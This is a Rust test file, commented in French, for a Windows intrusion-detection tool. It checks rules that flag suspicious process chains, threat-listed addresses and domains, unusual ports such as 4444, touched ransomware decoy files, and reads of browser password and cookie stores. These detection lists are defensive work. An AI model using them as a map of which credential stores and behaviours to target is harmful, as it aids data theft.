        (100, ("explorer", 4)), (200, ("cmd", 100)), (300, ("powershell", 200)), (400, ("certutil", 300)),
        (500, ("notepad", 100)),
    ].into_iter().map(|(pid, (nom, parent))| (pid, InfoListe { nom: nom.into(), parent })).collect();
    arbre.maj(&liste);
    arbre
}

#[test]
fn cha_001_positif() {
    // Deux signaux dans la même descendance, score cumulé au seuil (12) : une alerte Critique, une seule fois par niveau
    let mut arbre = arbre_de_test();
    arbre.signaler(300, 5, "PowerShell obscurci ou qui télécharge du code");
    arbre.signaler(400, 7, "connexion vers une adresse inconnue");
    let chaines = arbre.chaines();
    let a = arbre.alertes(&chaines);
    assert_eq!(a.iter().map(|a| (a.regle.as_str(), a.niveau.as_str(), a.score)).collect::<Vec<_>>(), [("CHA-001", "Critique", 12)]);
    assert!(arbre.alertes(&chaines).is_empty(), "pas de nouvelle alerte au même score");
    // Score plus haut : nouvelle alerte
    arbre.signaler(200, 3, "écriture dans un dossier de démarrage");
    let chaines = arbre.chaines();
    assert_eq!(arbre.alertes(&chaines).len(), 1);
}

#[test]
fn cha_001_negatif() {
    // Un seul signal fort (14) : pas une chaîne ; deux signaux sous le seuil (11) : rien
    let mut arbre = arbre_de_test();
    arbre.signaler(400, 14, "connexion vers une adresse inconnue");
    assert!(arbre.alertes(&arbre.chaines()).is_empty(), "un seul signal");
    let mut arbre = arbre_de_test();
    arbre.signaler(300, 5, "PowerShell obscurci ou qui télécharge du code");
    arbre.signaler(400, 6, "connexion vers une adresse inconnue");
    assert!(arbre.alertes(&arbre.chaines()).is_empty(), "sous le seuil");
    // Deux signaux dans deux descendances distinctes de l'Explorateur (racine) : deux chaînes, aucune au seuil
    let mut arbre = arbre_de_test();
    arbre.signaler(400, 7, "connexion vers une adresse inconnue");
    arbre.signaler(500, 7, "connexion vers une adresse inconnue");
    assert!(arbre.alertes(&arbre.chaines()).is_empty(), "racines distinctes");
}

// ------------------------------------------------------------ RES et DNS : connexions et requêtes DNS (PR 3.8)
// Décisions pures du cycle de surveillance (moniteur::score_flux, regle_flux, premiere_connexion_signalee,
// alerte_adresses_publiques, alerte_dns), des ports en écoute (surveillances::ports_ouverts) et du journal du pare-feu
// (parefeu::exposition_reelle). Adresses de documentation (RFC 5737) seulement.

/// Indices d'une connexion banale : programme signé, nom DNS connu, port courant
fn indices_banals() -> crate::moniteur::IndicesFlux<'static> {
    crate::moniteur::IndicesFlux {
        menace: None, non_signe: false, dossier_temporaire: false, origine: None, suspicion_ligne: None, nom_dns_connu: true,
        navigateur_doh: false, application_ip_directe: false, dns_lu: true, preexistant: false, balise: None, port: 443,
        telemetrie: false, bloque: false,
    }
}

#[test]
fn res_001_positif() {
    use crate::moniteur::{regle_flux, score_flux, IndicesFlux};
    // Adresse d'une liste de menaces trouvée ; l'alerte part même pour une connexion déjà ouverte au démarrage
    let m = crate::menaces::menaces_test(&["203.0.113.66"], &[]);
    let source = m.chercher_ip("203.0.113.66").expect("adresse de la liste").source;
    let (score, raisons) = score_flux(&IndicesFlux { menace: Some(&source), ..indices_banals() });
    assert_eq!((score, raisons[0].as_str()), (10, "MENACE CONNUE (essai)"));
    assert_eq!(regle_flux(true, false, true, score), Some("RES-001"));
}

#[test]
fn res_001_negatif() {
    use crate::moniteur::regle_flux;
    // Une liste ne fait jamais signaler une adresse privée (imprimante, box) ; adresse publique absente de la liste
    let m = crate::menaces::menaces_test(&["203.0.113.66", "192.168.1.10"], &[]);
    assert!(m.chercher_ip("192.168.1.10").is_none());
    assert!(m.chercher_ip("203.0.113.67").is_none());
    assert_eq!(regle_flux(false, false, true, 0), None);
}

#[test]
fn res_002_positif() {
    use crate::moniteur::{regle_flux, score_flux, IndicesFlux};
    // Programme non signé : 3, au seuil
    let (score, raisons) = score_flux(&IndicesFlux { non_signe: true, ..indices_banals() });
    assert_eq!((score, raisons.join(", ").as_str()), (3, "NON SIGNÉ"));
    assert_eq!(regle_flux(false, true, false, score), Some("RES-002"));
    // IP directe (journal DNS lu, connexion nouvelle) et port inhabituel : 2 + 1
    let (score, raisons) = score_flux(&IndicesFlux { nom_dns_connu: false, port: 4444, ..indices_banals() });
    assert_eq!((score, raisons.join(", ").as_str()), (3, "IP DIRECTE (aucune requête DNS), port inhabituel 4444"));
    assert_eq!(regle_flux(false, true, false, score), Some("RES-002"));
    // Non signé, téléchargé depuis Internet hier, balise : 3 + 3 + 3 (balise forte : non signé)
    let (score, _) = score_flux(&IndicesFlux { non_signe: true, origine: Some(("téléchargé depuis Internet", 1)), balise: Some(60), ..indices_banals() });
    assert_eq!(score, 9);
    // Balise d'un programme signé : forte sans nom DNS (3, plus l'IP directe : 2), faible avec un nom (1)
    assert_eq!(score_flux(&IndicesFlux { nom_dns_connu: false, balise: Some(60), ..indices_banals() }).0, 5);
    assert_eq!(score_flux(&IndicesFlux { balise: Some(60), ..indices_banals() }).0, 1);
}

#[test]
fn res_002_negatif() {
    use crate::moniteur::{regle_flux, score_flux, IndicesFlux};
    // Connexion banale : 0
    assert_eq!(score_flux(&indices_banals()).0, 0);
    // Origine Internet d'un programme signé : pas comptée ; navigateur sans DNS (DoH) : pas compté
    assert_eq!(score_flux(&IndicesFlux { origine: Some(("téléchargé depuis Internet", 0)), ..indices_banals() }).0, 0);
    assert_eq!(score_flux(&IndicesFlux { nom_dns_connu: false, navigateur_doh: true, ..indices_banals() }).0, 0);
    // Journal DNS non lu, ou connexion déjà ouverte au démarrage : « nom DNS inconnu », sans indice
    let (score, raisons) = score_flux(&IndicesFlux { nom_dns_connu: false, dns_lu: false, ..indices_banals() });
    assert_eq!((score, raisons.join(", ").as_str()), (0, "nom DNS inconnu"));
    assert_eq!(score_flux(&IndicesFlux { nom_dns_connu: false, preexistant: true, ..indices_banals() }).0, 0);
    // Score au seuil mais connexion déjà vue, ou premier passage : rien
    assert_eq!(regle_flux(false, false, false, 5), None);
    assert_eq!(regle_flux(false, true, true, 5), None);
    assert_eq!(regle_flux(false, true, false, 2), None);
}

#[test]
fn res_003_positif() {
    assert!(crate::moniteur::premiere_connexion_signalee(false, false));
}

#[test]
fn res_003_negatif() {
    // Apprentissage, ou connexions déjà ouvertes au démarrage du service (premier passage)
    assert!(!crate::moniteur::premiere_connexion_signalee(true, false));
    assert!(!crate::moniteur::premiere_connexion_signalee(false, true));
}

/// Adresse publique sous la forme relevée par parefeu::adresses_publiques : « adresse (carte) »
fn releve(adresse: &str) -> String {
    format!("{adresse} (Wi-Fi)")
}

#[test]
fn res_004_positif() {
    use crate::moniteur::alerte_adresses_publiques;
    let a = alerte_adresses_publiques(&[], &[releve("203.0.113.7")]).expect("adresse apparue");
    assert_eq!((a.regle.as_str(), a.niveau.as_str()), ("RES-004", "Alerte"));
    // PR 3.8 : une adresse publique qui en remplace une autre (même nombre d'adresses) alerte aussi
    assert!(alerte_adresses_publiques(&[releve("203.0.113.7")], &[releve("198.51.100.9")]).is_some());
    // IPv6 : nouveau préfixe /64 (adresses de documentation, RFC 3849)
    assert!(alerte_adresses_publiques(&[releve("2001:db8:1:1::10")], &[releve("2001:db8:1:2::10")]).is_some());
}

#[test]
fn res_004_negatif() {
    use crate::moniteur::alerte_adresses_publiques;
    // Mêmes adresses, ou adresse disparue
    assert!(alerte_adresses_publiques(&[releve("203.0.113.7")], &[releve("203.0.113.7")]).is_none());
    assert!(alerte_adresses_publiques(&[releve("203.0.113.7"), releve("198.51.100.9")], &[releve("203.0.113.7")]).is_none());
    assert!(alerte_adresses_publiques(&[], &[]).is_none());
    // Relecture de #87, D1 et R2-D1 : adresse temporaire IPv6 renouvelée dans le même préfixe /64 (chaque jour, et à
    // chaque reconnexion), sous la forme relevée : pas une exposition nouvelle
    assert!(alerte_adresses_publiques(&[releve("2001:db8:1:1:a1b2:c3d4:e5f6:1")], &[releve("2001:db8:1:1:9f8e:7d6c:5b4a:2")]).is_none());
    assert!(alerte_adresses_publiques(&[releve("2001:db8:1:1::10"), releve("2001:db8:1:1:a1b2:c3d4:e5f6:1")],
                                      &[releve("2001:db8:1:1::10"), releve("2001:db8:1:1:9f8e:7d6c:5b4a:2")]).is_none());
    // Même adresse vue sur une autre carte : pas une exposition nouvelle
    assert!(alerte_adresses_publiques(&[releve("203.0.113.7")], &["203.0.113.7 (Ethernet)".into()]).is_none());
}

/// Relecture de #87, R2-D1 : la forme lue par alerte_adresses_publiques est celle que parefeu::adresses_publiques produit
/// (contrôle du source : l'appel Windows ne s'exécute pas en test)
#[test]
fn res_004_forme_du_releve() {
    let p = include_str!("parefeu.rs").replace("\r\n", "\n");
    assert!(p.contains("l.push(format!(\"{ip} ({nom})\"));"), "forme « adresse (carte) » changée : revoir moniteur::reseau_public et releve()");
}

#[test]
fn res_005_positif() {
    use crate::parefeu::{exposition_reelle, ContexteExposition};
    // Paquet venu d'Internet vers un port en écoute (la chaîne complète, du journal à l'alerte, est exercée par
    // exposition_reelle_sans_faux_positifs)
    let ctx = ContexteExposition { ecoute_tcp: [3389u16].into_iter().collect(), udp_dynamique: (49152, 65535), pid_service: 4000 };
    assert!(exposition_reelle("TCP", 3389, 9999, "-", &ctx));
    assert!(exposition_reelle("ICMP", 0, 9999, "8", &ctx), "demande d'écho venue d'Internet");
}

#[test]
fn res_005_negatif() {
    use crate::parefeu::{exposition_reelle, ContexteExposition};
    // Réponse à une connexion sortante (port éphémère, rien n'y écoute), réponse UDP, réponse d'écho
    let ctx = ContexteExposition { ecoute_tcp: [3389u16].into_iter().collect(), udp_dynamique: (49152, 65535), pid_service: 4000 };
    assert!(!exposition_reelle("TCP", 51000, 9999, "-", &ctx));
    assert!(!exposition_reelle("UDP", 50003, 9999, "-", &ctx));
    assert!(!exposition_reelle("ICMP", 0, 9999, "0", &ctx));
}

/// Ports en écoute : un tour de surveillances::ports_ouverts, sans fichier ni appel Windows
fn tour_ports(connues: &mut std::collections::HashMap<String, String>, apprentissage: &mut bool, tcp: &[crate::natif::Connexion],
              signataire: &str) -> Vec<(String, String)> {
    let mut ecoutes = Vec::new();
    let mut alertes = Vec::new();
    let chemin_de = |pid: u32| if pid == 4 { String::new() } else { format!(r"C:\Outils\serveur{pid}.exe") };
    let sig = signataire.to_string();
    crate::surveillances::ports_ouverts(connues, apprentissage, &mut ecoutes, tcp, &chemin_de, &mut |_| sig.clone(), &mut alertes);
    alertes.into_iter().map(|a| (a.regle, a.niveau)).collect()
}

#[test]
fn res_006_positif() {
    use crate::natif::Connexion;
    let mut connues = std::collections::HashMap::new();
    // Premier relevé : apprentissage, rien ; puis un port nouveau, programme non signé : Alerte ; signé : Info
    let mut apprentissage = true;
    assert!(tour_ports(&mut connues, &mut apprentissage, &[Connexion::pour_test(700, 2, "0.0.0.0", 8000, "0.0.0.0", 0)], "").is_empty());
    assert!(!apprentissage);
    let ecoute = [Connexion::pour_test(700, 2, "0.0.0.0", 8000, "0.0.0.0", 0), Connexion::pour_test(701, 2, "0.0.0.0", 4444, "0.0.0.0", 0)];
    assert_eq!(tour_ports(&mut connues, &mut apprentissage, &ecoute, ""), [("RES-006".to_string(), "Alerte".to_string())]);
    let ecoute = [Connexion::pour_test(702, 2, "0.0.0.0", 9000, "0.0.0.0", 0)];
    assert_eq!(tour_ports(&mut connues, &mut apprentissage, &ecoute, "Éditeur"), [("RES-006".to_string(), "Info".to_string())]);
}

#[test]
fn res_006_negatif() {
    use crate::natif::Connexion;
    let mut connues = std::collections::HashMap::new();
    let mut apprentissage = false;
    // Écoute sur la boucle locale ; port RPC dynamique de Windows ; port déjà connu
    let ecoute = [Connexion::pour_test(700, 2, "127.0.0.1", 8000, "0.0.0.0", 0), Connexion::pour_test(701, 2, "0.0.0.0", 49700, "0.0.0.0", 0)];
    assert!(tour_ports(&mut connues, &mut apprentissage, &ecoute, "Microsoft Windows").is_empty());
    let ecoute = [Connexion::pour_test(702, 2, "0.0.0.0", 8000, "0.0.0.0", 0)];
    assert_eq!(tour_ports(&mut connues, &mut apprentissage, &ecoute, "Éditeur").len(), 1);
    assert!(tour_ports(&mut connues, &mut apprentissage, &ecoute, "Éditeur").is_empty(), "déjà connu");
}

#[test]
fn res_007_positif() {
    use crate::natif::Connexion;
    let mut connues = std::collections::HashMap::new();
    let mut apprentissage = true;
    // Connexion établie depuis Internet sur un port en écoute : Critique si le programme n'est pas signé, Alerte sinon
    let tcp = [Connexion::pour_test(700, 2, "0.0.0.0", 3389, "0.0.0.0", 0), Connexion::pour_test(700, 5, "192.168.0.10", 3389, "203.0.113.9", 51515)];
    assert_eq!(tour_ports(&mut connues, &mut apprentissage, &tcp, ""), [("RES-007".to_string(), "Critique".to_string())]);
    assert_eq!(tour_ports(&mut connues, &mut apprentissage, &tcp, "Éditeur"), [("RES-007".to_string(), "Alerte".to_string())]);
}

#[test]
fn res_007_negatif() {
    use crate::natif::Connexion;
    let mut connues = std::collections::HashMap::new();
    let mut apprentissage = true;
    // Connexion entrante depuis le réseau local ; connexion sortante (port local qui n'écoute pas)
    let tcp = [Connexion::pour_test(700, 2, "0.0.0.0", 3389, "0.0.0.0", 0), Connexion::pour_test(700, 5, "192.168.0.10", 3389, "192.168.0.20", 51515),
               Connexion::pour_test(800, 5, "192.168.0.10", 50123, "203.0.113.9", 443)];
    assert!(tour_ports(&mut connues, &mut apprentissage, &tcp, "").is_empty());
    // Adresse du partage d'adresses des opérateurs (CGNAT, 100.64.0.0/10) : ni locale, ni publique
    let tcp = [Connexion::pour_test(700, 2, "0.0.0.0", 3389, "0.0.0.0", 0), Connexion::pour_test(700, 5, "100.64.1.5", 3389, "100.64.7.8", 51515)];
    assert!(tour_ports(&mut connues, &mut apprentissage, &tcp, "").is_empty(), "CGNAT");
}

#[test]
fn dns_001_positif() {
    let m = crate::menaces::menaces_test(&[], &["malveillant.example"]);
    let a = crate::moniteur::alerte_dns(&m, "malveillant.example").expect("domaine de la liste");
    assert_eq!((a.regle.as_str(), a.niveau.as_str(), a.score), ("DNS-001", "Critique", 10));
    // La casse ne compte pas
    assert!(crate::moniteur::alerte_dns(&m, "MALVEILLANT.example").is_some());
}

#[test]
fn dns_001_negatif() {
    let m = crate::menaces::menaces_test(&[], &["malveillant.example"]);
    // Autre domaine, sous-domaine (les listes portent des noms exacts), nom vide
    assert!(crate::moniteur::alerte_dns(&m, "sain.example").is_none());
    assert!(crate::moniteur::alerte_dns(&m, "www.malveillant.example").is_none());
    assert!(crate::moniteur::alerte_dns(&m, "").is_none());
}

// ------------------------------------------------------------ LEU et VOL : leurres et vol de données (PR 3.9)
// hygiene::verifier_leurres sur de vrais fichiers temporaires ; décisions pures hygiene::pid_touchant_leurre_parmi,
// vol_donnees::alerte_leurre_touche, vol_donnees::analyser et vol_donnees::premiere_en_24h sur des événements 4663
// synthétiques (aucun fichier du dossier de données lu ni écrit).

fn dossier_regle(nom: &str) -> std::path::PathBuf {
    let d = std::env::temp_dir().join(format!("d4t-regle-{nom}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&d);
    std::fs::create_dir_all(&d).unwrap();
    d
}

fn leurre_de_test(d: &std::path::Path, nom: &str) -> crate::hygiene::Leurre {
    let f = d.join(nom);
    std::fs::write(&f, b"contenu du leurre").unwrap();
    let empreinte = crate::hygiene::empreinte_verifiee(&f).expect("empreinte");
    crate::hygiene::Leurre { chemin: f.to_string_lossy().to_string(), empreinte }
}

#[test]
fn leu_001_positif() {
    let d = dossier_regle("leu1");
    let mut liste = vec![leurre_de_test(&d, "0 Factures 1234.docx"), leurre_de_test(&d, "0 Budget 5678.xlsx")];
    std::fs::write(d.join("0 Factures 1234.docx"), b"contenu chiffre").unwrap();
    std::fs::remove_file(d.join("0 Budget 5678.xlsx")).unwrap();
    let a = crate::hygiene::verifier_leurres(&mut liste);
    let _ = std::fs::remove_dir_all(&d);
    assert_eq!(a.iter().map(|a| (a.regle.as_str(), a.niveau.as_str())).collect::<Vec<_>>(), [("LEU-001", "Critique"), ("LEU-001", "Critique")]);
    assert!(a[0].raisons.contains("MODIFIÉ") && a[1].raisons.contains("SUPPRIMÉ"), "{} / {}", a[0].raisons, a[1].raisons);
    assert!(liste.is_empty(), "un leurre signalé n'est plus suivi (pas d'alerte à chaque tour)");
}

#[test]
fn leu_001_negatif() {
    let d = dossier_regle("leu1n");
    let mut liste = vec![leurre_de_test(&d, "0 Contrat 4321.docx")];
    // Leurre lu sans être modifié (sa date d'accès peut changer) : rien
    let _ = std::fs::read(d.join("0 Contrat 4321.docx")).unwrap();
    let a = crate::hygiene::verifier_leurres(&mut liste);
    let _ = std::fs::remove_dir_all(&d);
    assert!(a.is_empty());
    assert_eq!(liste.len(), 1);
}

fn noms_de_test() -> Vec<(String, String)> {
    vec![("Documents".into(), "0 Factures 1234.docx".into()), ("Pictures".into(), "0 IMG_5678.jpg".into())]
}

#[test]
fn leu_002_positif() {
    let xml = evenement_defender(4663, &[("ObjectName", r"C:\Users\essai\Documents\0 Factures 1234.docx"), ("ProcessId", "0x1a2b"),
                                        ("ProcessName", r"C:\Users\essai\AppData\Local\Temp\chiffreur.exe")]);
    let (pid, programme, objet) = crate::hygiene::pid_touchant_leurre_parmi(&xml, &noms_de_test()).expect("leurre touché");
    assert_eq!(pid, 0x1a2b);
    // Programme inconnu : Critique, suspendu si la réponse automatique l'a fait
    let a = crate::vol_donnees::alerte_leurre_touche(pid, &programme, &objet, false, true);
    assert_eq!((a.regle.as_str(), a.niveau.as_str(), a.score), ("LEU-002", "Critique", 15));
    assert!(a.raisons.contains("RANÇONGICIEL PROBABLE") && a.raisons.contains("SUSPENDU"), "{}", a.raisons);
    let a = crate::vol_donnees::alerte_leurre_touche(pid, &programme, &objet, false, false);
    assert!(!a.raisons.contains("SUSPENDU"), "pas de suspension annoncée sans suspension : {}", a.raisons);
    // La casse du nom ne compte pas
    let xml = evenement_defender(4663, &[("ObjectName", r"C:\Users\essai\Pictures\0 img_5678.JPG"), ("ProcessId", "0x10")]);
    assert!(crate::hygiene::pid_touchant_leurre_parmi(&xml, &noms_de_test()).is_some());
}

#[test]
fn leu_002_negatif() {
    // Autre fichier ; logiciel connu et signé (sauvegarde, synchronisation, antivirus) : Info, jamais suspendu
    let xml = evenement_defender(4663, &[("ObjectName", r"C:\Users\essai\Documents\Rapport.docx"), ("ProcessId", "0x1a2b")]);
    assert!(crate::hygiene::pid_touchant_leurre_parmi(&xml, &noms_de_test()).is_none());
    let a = crate::vol_donnees::alerte_leurre_touche(0x1a2b, r"C:\Program Files\Sauvegarde\agent.exe", r"C:\Users\essai\Documents\0 Factures 1234.docx", true, false);
    assert_eq!((a.regle.as_str(), a.niveau.as_str()), ("LEU-002", "Info"));
    assert!(a.raisons.contains("non suspendu"));
}

fn evenement_vol(objet: &str, processus: &str) -> String {
    evenement_defender(4663, &[("ObjectName", objet), ("ProcessName", processus), ("ProcessId", "0x2c")])
}

#[test]
fn vol_001_positif() {
    use crate::vol_donnees::{analyser, CIBLES};
    let mots_de_passe = r"C:\Users\essai\AppData\Local\Google\Chrome\User Data\Default";
    let dossiers = vec![(mots_de_passe.to_string(), &CIBLES[1])];
    let objet = format!(r"{mots_de_passe}\Login Data");
    // Programme lancé depuis un dossier temporaire : Critique ; ailleurs : Alerte
    let a = analyser(&evenement_vol(&objet, r"C:\Users\essai\AppData\Local\Temp\voleur.exe"), &dossiers).expect("alerte");
    assert_eq!((a.regle.as_str(), a.niveau.as_str(), a.score, a.pid), ("VOL-001", "Critique", 10, Some(0x2c)));
    let a = analyser(&evenement_vol(&objet, r"C:\Outils\lecteur.exe"), &dossiers).expect("alerte");
    assert_eq!((a.niveau.as_str(), a.score), ("Alerte", 7));
    // Un « chrome.exe » qui n'est pas signé par Google n'est pas le propriétaire
    assert!(analyser(&evenement_vol(&objet, r"C:\Users\essai\Downloads\chrome.exe"), &dossiers).is_some());
}

#[test]
fn vol_001_negatif() {
    use crate::vol_donnees::{analyser, CIBLES};
    let d = dossier_regle("vol1");
    let dossier = d.to_string_lossy().to_string();
    let dossiers = vec![(dossier.clone(), &CIBLES[1])];
    std::fs::create_dir_all(d.join("Network")).unwrap();
    // Fichier hors des dossiers surveillés ; dossier parcouru (aucune donnée lue) ; notre propre service
    assert!(analyser(&evenement_vol(r"C:\Users\essai\Documents\note.txt", r"C:\Outils\lecteur.exe"), &dossiers).is_none());
    assert!(analyser(&evenement_vol(&d.join("Network").to_string_lossy(), r"C:\Outils\lecteur.exe"), &dossiers).is_none());
    let nous = std::env::current_exe().unwrap().to_string_lossy().to_string();
    assert!(analyser(&evenement_vol(&d.join("Login Data").to_string_lossy(), &nous), &dossiers).is_none());
    let _ = std::fs::remove_dir_all(&d);
    // Même programme et même cible : une alerte par 24 h
    use crate::vol_donnees::premiere_en_24h;
    let mut vues = std::collections::HashMap::new();
    let t0 = std::time::Instant::now();
    assert!(premiere_en_24h(&mut vues, "lecteur|cookies".into(), t0));
    assert!(!premiere_en_24h(&mut vues, "lecteur|cookies".into(), t0 + std::time::Duration::from_secs(3600)));
    assert!(premiere_en_24h(&mut vues, "lecteur|mots de passe".into(), t0 + std::time::Duration::from_secs(3600)), "autre cible");
    assert!(premiere_en_24h(&mut vues, "lecteur|cookies".into(), t0 + std::time::Duration::from_secs(90_000)), "24 h passées");
}
